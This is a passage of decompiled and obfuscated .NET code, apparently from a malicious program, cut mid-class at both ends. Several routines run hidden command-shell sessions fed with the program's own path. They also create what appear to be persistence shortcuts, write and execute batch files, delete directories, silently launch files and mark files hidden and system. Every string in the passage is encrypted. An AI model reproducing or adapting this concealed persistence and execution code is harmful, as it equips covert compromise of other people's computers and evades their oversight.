	static byte[] smethod_71(byte[] byte_0)
	{
		return Class33.smethod_54((byte[])null, byte_0, 1, (byte[])null);
	}

	static void smethod_72()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		string text3 = default(string);
		Process process = default(Process);
		StreamWriter standardInput = default(StreamWriter);
		string text6 = default(string);
		string text7 = default(string);
		object objectValue2 = default(object);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				object executablePath;
				string text2;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1474:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_0044;
						case 5:
							goto IL_0053;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_006b;
						case 8:
							goto IL_0093;
						case 9:
							goto IL_00d4;
						case 10:
							goto IL_00ef;
						case 11:
							goto IL_0126;
						case 12:
							goto IL_0168;
						case 13:
							goto IL_0173;
						case 14:
							goto IL_018d;
						case 15:
							goto IL_019e;
						case 16:
							goto IL_01af;
						case 17:
							goto IL_01c0;
						case 18:
							goto IL_01d1;
						case 19:
							goto IL_01e2;
						case 20:
							goto IL_01ee;
						case 21:
							goto IL_01fb;
						case 22:
							goto IL_020b;
						case 23:
							goto IL_021a;
						case 24:
							goto IL_022a;
						case 25:
							goto IL_023a;
						case 26:
							goto IL_024a;
						case 27:
							goto IL_0256;
						case 28:
							goto IL_02a9;
						case 29:
							goto IL_02d7;
						case 30:
							goto IL_02f6;
						case 31:
							goto IL_0301;
						case 32:
							goto IL_030e;
						case 33:
						case 34:
							goto IL_0319;
						case 35:
							goto IL_0324;
						case 36:
							goto IL_0348;
						case 37:
							goto IL_036c;
						case 38:
							goto IL_03ab;
						case 39:
							goto IL_040a;
						case 40:
							goto IL_041a;
						case 41:
							goto IL_0479;
						case 42:
							goto IL_0489;
						case 43:
							goto IL_04b5;
						case 44:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 45:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_04b5:
					num = 43;
					NewLateBinding.LateCall(objectValue, (Type)null, Class14.smethod_0(2626), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_0035;
					IL_0035:
					num = 3;
					Conversion.Int((object)false);
					goto IL_0044;
					IL_0044:
					num = 4;
					Conversion.Int((object)false);
					goto IL_0053;
					IL_0053:
					num = 5;
					executablePath = Application.get_ExecutablePath();
					goto IL_005c;
					IL_005c:
					num = 6;
					Conversion.Int((object)false);
					goto IL_006b;
					IL_006b:
					num = 7;
					text2 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class14.smethod_0(2080);
					goto IL_0093;
					IL_0093:
					num = 8;
					text3 = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385)) + Class14.smethod_0(257);
					goto IL_00d4;
					IL_00d4:
					num = 9;
					Directory.CreateDirectory(text3 + Class14.smethod_0(2089));
					goto IL_00ef;
					IL_00ef:
					num = 10;
					text4 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291)) + Class14.smethod_0(2102);
					goto IL_0126;
					IL_0126:
					num = 11;
					text5 = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385)) + Class14.smethod_0(631);
					goto IL_0168;
					IL_0168:
					num = 12;
					process = new Process();
					goto IL_0173;
					IL_0173:
					num = 13;
					process.StartInfo.FileName = Class14.smethod_0(2179);
					goto IL_018d;
					IL_018d:
					num = 14;
					process.StartInfo.UseShellExecute = false;
					goto IL_019e;
					IL_019e:
					num = 15;
					process.StartInfo.CreateNoWindow = true;
					goto IL_01af;
					IL_01af:
					num = 16;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_01c0;
					IL_01c0:
					num = 17;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_01d1;
					IL_01d1:
					num = 18;
					process.StartInfo.RedirectStandardError = true;
					goto IL_01e2;
					IL_01e2:
					num = 19;
					process.Start();
					goto IL_01ee;
					IL_01ee:
					num = 20;
					standardInput = process.StandardInput;
					goto IL_01fb;
					IL_01fb:
					num = 21;
					Conversion.Int((object)false);
					goto IL_020b;
					IL_020b:
					num = 22;
					text6 = Class14.smethod_0(2192);
					goto IL_021a;
					IL_021a:
					num = 23;
					Conversion.Int((object)false);
					goto IL_022a;
					IL_022a:
					num = 24;
					text7 = Class14.smethod_0(2197);
					goto IL_023a;
					IL_023a:
					num = 25;
					Conversion.Int((object)false);
					goto IL_024a;
					IL_024a:
					num = 26;
					standardInput.AutoFlush = true;
					goto IL_0256;
					IL_0256:
					num = 27;
					standardInput.Write(text6 + text7 + Class14.smethod_0(2202) + Application.get_ExecutablePath() + Class14.smethod_0(2207) + Environment.NewLine);
					goto IL_02a9;
					IL_02a9:
					num = 28;
					standardInput.Write(Class33.smethod_140(Class14.smethod_0(2252)) + Class14.smethod_0(2426) + Environment.NewLine);
					goto IL_02d7;
					IL_02d7:
					num = 29;
					standardInput.Write(Class14.smethod_0(2475) + Environment.NewLine);
					goto IL_02f6;
					IL_02f6:
					num = 30;
					process.WaitForExit();
					goto IL_0301;
					IL_0301:
					num = 31;
					if (!process.HasExited)
					{
						goto IL_030e;
					}
					goto IL_0319;
					IL_030e:
					num = 32;
					process.Kill();
					goto IL_0319;
					IL_0319:
					num = 34;
					standardInput.Flush();
					goto IL_0324;
					IL_0324:
					num = 35;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class14.smethod_0(2484), Class14.smethod_0(257)));
					goto IL_0348;
					IL_0348:
					num = 36;
					objectValue2 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class14.smethod_0(2484), Class14.smethod_0(257)));
					goto IL_036c;
					IL_036c:
					num = 37;
					objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, Class14.smethod_0(2505), new object[1] { text3 + Class14.smethod_0(2526) }, (string[])null, (Type[])null, (bool[])null));
					goto IL_03ab;
					IL_03ab:
					num = 38;
					NewLateBinding.LateSet(objectValue, (Type)null, Class14.smethod_0(2559), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, Class14.smethod_0(2576), new object[1] { text3 + Class14.smethod_0(631) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_040a;
					IL_040a:
					num = 39;
					Conversion.Int((object)false);
					goto IL_041a;
					IL_041a:
					num = 40;
					NewLateBinding.LateSet(obj, (Type)null, Class14.smethod_0(2559), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, Class14.smethod_0(2576), new object[1] { text3 + Class14.smethod_0(631) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_0479;
					IL_0479:
					num = 41;
					Conversion.Int((object)false);
					goto IL_0489;
					IL_0489:
					num = 42;
					NewLateBinding.LateSet(objectValue, (Type)null, Class14.smethod_0(2609), new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_04b5;
					end_IL_0000_2:
					break;
				}
				num = 44;
				NewLateBinding.LateCall(obj, (Type)null, Class14.smethod_0(2626), new object[0], (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 1474;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_73(Exception exception_0, object[] object_0)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains(Class14.smethod_0(2635)))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data[Class14.smethod_0(2635)] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data[Class14.smethod_0(2635)];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static int smethod_74(Class15.Class17 class17_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class17_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class17_0.uint_0;
			class17_0.uint_0 >>= 8;
			class17_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class17_0.int_1 - class17_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class17_0.byte_0, class17_0.int_0, byte_0, int_0, int_1);
		class17_0.int_0 += int_1;
		if (((uint)(class17_0.int_0 - class17_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class17_0.uint_0 = class17_0.byte_0[class17_0.int_0++] & 0xFFu;
			class17_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_75()
	{
		string text = Class14.smethod_0(257);
	}

	static void smethod_76(Class15.Class18 class18_0)
	{
		int num = 0;
		class18_0.int_0 = 0;
		class18_0.int_1 = 0;
	}

	static void smethod_77(Class15.Class17 class17_0, int int_0)
	{
		class17_0.uint_0 >>= int_0;
		class17_0.int_2 -= int_0;
	}

	static void smethod_78(Exception exception_0, Class29 class29_0)
	{
		using (new Class43(class29_0.xmlWriter_0, Class14.smethod_0(2660)))
		{
			try
			{
				Type type = exception_0.GetType();
				class29_0.method_3(type);
				string value = Class14.smethod_0(2673);
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(2678), value);
				string text = exception_0.StackTrace!.Trim();
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(2691), text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf(Class14.smethod_0(2720));
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class29_0.xmlWriter_0.WriteAttributeString(Class14.smethod_0(2725), text);
				class29_0.method_1(new Class34(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_79(string string_0, EventArgs1 eventArgs1_0, string string_1)
	{
		Class33.smethod_39(string_0, eventArgs1_0.class29_0, (object)string_1);
	}

	static void smethod_80(Exception exception_0, object object_0)
	{
		Class33.smethod_73(exception_0, new object[1] { object_0 });
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetUseGetInfo(ref IntPtr intptr_0, ref IntPtr intptr_1, long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static int smethod_81(Class15.Class17 class17_0, int int_0)
	{
		if (class17_0.int_2 < int_0)
		{
			if (class17_0.int_0 == class17_0.int_1)
			{
				return -1;
			}
			class17_0.uint_0 |= (uint)(((class17_0.byte_0[class17_0.int_0++] & 0xFF) | ((class17_0.byte_0[class17_0.int_0++] & 0xFF) << 8)) << class17_0.int_2);
			class17_0.int_2 += 16;
		}
		return (int)(class17_0.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_82(Class15.Class18 class18_0, Class15.Class17 class17_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class18_0.int_1), class17_0.AvailableBytes);
		int num = 32768 - class18_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class33.smethod_74(class17_0, class18_0.byte_0, class18_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class33.smethod_74(class17_0, class18_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class33.smethod_74(class17_0, class18_0.byte_0, class18_0.int_0, int_0);
		}
		class18_0.int_0 = (class18_0.int_0 + num2) & 0x7FFF;
		class18_0.int_1 += num2;
		return num2;
	}

	static void smethod_83(byte[] byte_0, Class15.Class21 class21_0)
	{
		Class33.smethod_53(byte_0, class21_0.class24_0);
	}

	static bool smethod_84(Class15.Class22 class22_0, int int_0)
	{
		class22_0.short_0[class22_0.int_1] = 0;
		class22_0.byte_1[class22_0.int_1++] = (byte)int_0;
		class22_0.class23_0.short_0[int_0]++;
		return Class33.smethod_100(class22_0);
	}

	static void smethod_85(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class33.smethod_73(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static void smethod_86(Exception exception_0)
	{
		Class33.smethod_73(exception_0, new object[0]);
	}

	static string smethod_87()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class13.SubkeyApplication);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class13.WowSubkeyApplication);
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue(Class14.smethod_0(2734), null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_88(Class41 class41_0, Delegate12 delegate12_0)
	{
		if (class41_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class41_0.iwebProxy_0 != null)
				{
					goto IL_006c;
				}
				goto IL_0078;
				IL_0078:
				class41_0.string_2 = uploadReportLoginService.GetServerURL(class41_0.string_1);
				while (true)
				{
					if (class41_0.string_2.Length != 0)
					{
						if (!(class41_0.string_2 == Class14.smethod_0(2784)))
						{
							break;
						}
						if (aoKmv57A4wSEkvDOgia())
						{
							switch (5)
							{
							case 1:
							case 4:
								break;
							case 0:
								goto IL_006c;
							default:
								goto IL_008f;
							case 5:
								goto IL_009f;
							}
							continue;
						}
						goto IL_009f;
					}
					goto IL_008f;
					IL_009f:
					class41_0.string_2 = Class41.string_0;
					break;
					IL_008f:
					throw new ApplicationException(Class14.smethod_0(2743));
				}
				goto end_IL_000b;
				IL_006c:
				((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class41_0.iwebProxy_0);
				goto IL_0078;
				end_IL_000b:;
			}
			catch (Exception ex)
			{
				delegate12_0(Class14.smethod_0(2793) + ex.Message);
				return;
			}
		}
		delegate12_0(class41_0.string_2.StartsWith(Class14.smethod_0(1317)) ? class41_0.string_2 : Class14.smethod_0(1259));
	}

	static void smethod_89(int int_0, Class15.Stream0 stream0_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static int smethod_90(Class15.Class18 class18_0)
	{
		return class18_0.int_1;
	}

	static void smethod_91(Exception exception_0, object[] object_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class39.string_0 == Class14.smethod_0(2062)) || !Class39.Handler.method_2((SecurityException)exception_0))
		{
			Class33.smethod_73(exception_0, object_0);
			Class39.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static Assembly smethod_92()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_93(Class29 class29_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class33.smethod_46(class29_0, tempFileName);
			string path = Class33.smethod_87();
			Process.Start(Path.Combine(path, Class14.smethod_0(2810)), Class14.smethod_0(2835) + tempFileName + Class14.smethod_0(2202));
			if (class29_0.eventHandler_0 != null)
			{
				class29_0.eventHandler_0(class29_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception fatalException)
		{
			Class33.smethod_131(new EventArgs0(fatalException), class29_0);
		}
	}

	static void smethod_94(IWebProxy iwebProxy_0, Class39 class39_0)
	{
		class39_0.iwebProxy_0 = iwebProxy_0;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_95()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 755:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_005b;
						case 5:
							goto IL_0087;
						case 6:
							goto IL_009f;
						case 7:
							goto IL_00b6;
						case 8:
							goto IL_00d0;
						case 9:
							goto IL_00db;
						case 10:
							goto IL_00f5;
						case 11:
							goto IL_0105;
						case 12:
							goto IL_011a;
						case 13:
							goto IL_012a;
						case 14:
							goto IL_0144;
						case 15:
							goto IL_0154;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_017e;
						case 18:
							goto IL_0193;
						case 19:
							goto IL_01a3;
						case 20:
							goto IL_01d0;
						case 21:
							goto IL_01f5;
						case 22:
							goto IL_0205;
						case 23:
							goto IL_021f;
						case 24:
							goto IL_022f;
						case 25:
							goto IL_0244;
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0244:
					num = 25;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385));
					goto IL_0034;
					IL_0034:
					num = 3;
					text2 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class14.smethod_0(2080);
					goto IL_005b;
					IL_005b:
					num = 4;
					text3 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_0087;
					IL_0087:
					num = 5;
					File.Delete(text + Class14.smethod_0(2864));
					goto IL_009f;
					IL_009f:
					num = 6;
					if (Class33.smethod_0(Class14.smethod_0(2893)))
					{
						goto end_IL_0000_3;
					}
					goto IL_00b6;
					IL_00b6:
					num = 7;
					streamWriter = new StreamWriter(text + Class14.smethod_0(2898));
					goto IL_00d0;
					IL_00d0:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00db;
					IL_00db:
					num = 9;
					streamWriter.Write(Class33.smethod_140(Class14.smethod_0(2931)));
					goto IL_00f5;
					IL_00f5:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_0105;
					IL_0105:
					num = 11;
					streamWriter.Write(Class14.smethod_0(2964));
					goto IL_011a;
					IL_011a:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_012a;
					IL_012a:
					num = 13;
					streamWriter.Write(Class33.smethod_140(Class14.smethod_0(2985)));
					goto IL_0144;
					IL_0144:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_0154;
					IL_0154:
					num = 15;
					streamWriter.Write(Class33.smethod_140(Class14.smethod_0(3131)));
					goto IL_016e;
					IL_016e:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_017e;
					IL_017e:
					num = 17;
					streamWriter.Write(Class14.smethod_0(3164));
					goto IL_0193;
					IL_0193:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_01a3;
					IL_01a3:
					num = 19;
					text4 = Class14.smethod_0(3173) + Class33.smethod_140(Class14.smethod_0(525)) + Class14.smethod_0(614);
					goto IL_01d0;
					IL_01d0:
					num = 20;
					streamWriter.Write(Class14.smethod_0(3190) + text + Class14.smethod_0(3211));
					goto IL_01f5;
					IL_01f5:
					num = 21;
					streamWriter.Write(Environment.NewLine);
					goto IL_0205;
					IL_0205:
					num = 22;
					streamWriter.Write(Class33.smethod_140(Class14.smethod_0(3131)));
					goto IL_021f;
					IL_021f:
					num = 23;
					streamWriter.Write(Environment.NewLine);
					goto IL_022f;
					IL_022f:
					num = 24;
					streamWriter.Write(Class14.smethod_0(3240));
					goto IL_0244;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Interaction.Shell(text + Class14.smethod_0(2898), (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 755;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_96()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string path = default(string);
		FileAttributes fileAttributes = default(FileAttributes);
		string text = default(string);
		string text5 = default(string);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 525:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_005d;
						case 5:
							goto IL_0089;
						case 6:
							goto IL_009e;
						case 7:
							goto IL_00b8;
						case 8:
							goto IL_00c6;
						case 9:
							goto IL_00e2;
						case 10:
							goto IL_00f2;
						case 11:
							goto IL_0107;
						case 12:
							goto IL_0123;
						case 13:
							goto IL_012f;
						case 14:
							goto IL_013b;
						case 15:
						case 16:
						case 17:
							goto IL_0147;
						case 18:
							goto IL_014e;
						case 19:
							goto IL_015d;
						case 20:
							goto IL_0175;
						case 21:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 22:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0175:
					num = 20;
					File.SetAttributes(path, fileAttributes);
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385));
					goto IL_0035;
					IL_0035:
					num = 3;
					text2 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class14.smethod_0(2080);
					goto IL_005d;
					IL_005d:
					num = 4;
					text3 = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_0089;
					IL_0089:
					num = 5;
					text4 = text + Class14.smethod_0(3245);
					goto IL_009e;
					IL_009e:
					num = 6;
					Directory.Delete(text + Class14.smethod_0(3270), recursive: true);
					goto IL_00b8;
					IL_00b8:
					num = 7;
					text5 = Class14.smethod_0(3283);
					goto IL_00c6;
					IL_00c6:
					num = 8;
					if (Operators.CompareString(text5, Class33.smethod_140(Class14.smethod_0(3304)), false) == 0)
					{
						goto IL_00e2;
					}
					goto IL_0147;
					IL_00e2:
					num = 9;
					text6 = Class14.smethod_0(3337);
					goto IL_00f2;
					IL_00f2:
					num = 10;
					if (!Class33.smethod_0(Class14.smethod_0(2893)))
					{
						goto IL_0107;
					}
					goto IL_0147;
					IL_0107:
					num = 11;
					processStartInfo = new ProcessStartInfo(text + Class14.smethod_0(2864));
					goto IL_0123;
					IL_0123:
					num = 12;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_012f;
					IL_012f:
					num = 13;
					processStartInfo.CreateNoWindow = true;
					goto IL_013b;
					IL_013b:
					num = 14;
					Process.Start(processStartInfo);
					goto IL_0147;
					IL_0147:
					num = 17;
					fileAttributes = FileAttributes.Hidden | FileAttributes.System;
					goto IL_014e;
					IL_014e:
					num = 18;
					text7 = Class14.smethod_0(3342);
					goto IL_015d;
					IL_015d:
					num = 19;
					path = text + text7 + Class14.smethod_0(3347);
					goto IL_0175;
					end_IL_0000_2:
					break;
				}
				num = 21;
				File.SetAttributes(text + Class14.smethod_0(2089), fileAttributes);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 525;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_97(Class15.Class24 class24_0)
	{
		if (class24_0.int_4 >= 65274)
		{
			Class33.smethod_151(class24_0);
		}
		while (class24_0.int_5 < 262 && class24_0.int_7 < class24_0.int_8)
		{
			int num = 65536 - class24_0.int_5 - class24_0.int_4;
			if (num > class24_0.int_8 - class24_0.int_7)
			{
				num = class24_0.int_8 - class24_0.int_7;
			}
			Array.Copy(class24_0.byte_1, class24_0.int_7, class24_0.byte_0, class24_0.int_4 + class24_0.int_5, num);
			class24_0.int_7 += num;
			class24_0.int_6 += num;
			class24_0.int_5 += num;
		}
		if (class24_0.int_5 >= 3)
		{
			Class33.smethod_114(class24_0);
		}
	}

	static int smethod_98(string string_0, Graphics graphics_0, int int_0, Font font_0)
	{
		try
		{
			return Class33.smethod_105(int_0, string_0, graphics_0, font_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class33.smethod_11(font_0, int_0, graphics_0, string_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static Assembly smethod_99(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class8.Struct4 @struct = new Class8.Struct4(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezQyMGM3MzY4LTUxNDYtNDAzZC1hMzNiLWMzODBmZTY4MWEzNH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{d8a2a019-ae64-4a73-9fa8-64e77856d168},ezQyMGM3MzY4LTUxNDYtNDAzZC1hMzNiLWMzODBmZTY4MWEzNH0=,[z]{d8a2a019-ae64-4a73-9fa8-64e77856d168}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class8.dictionary_0)
			{
				if (Class8.dictionary_0.ContainsKey(text2))
				{
					result = Class8.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_0265;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class33.smethod_154(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								MoveFileEx(text5, null, 4);
								MoveFileEx(text4, null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class8.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_0265;
		IL_0265:
		return null;
	}

	static bool smethod_100(Class15.Class22 class22_0)
	{
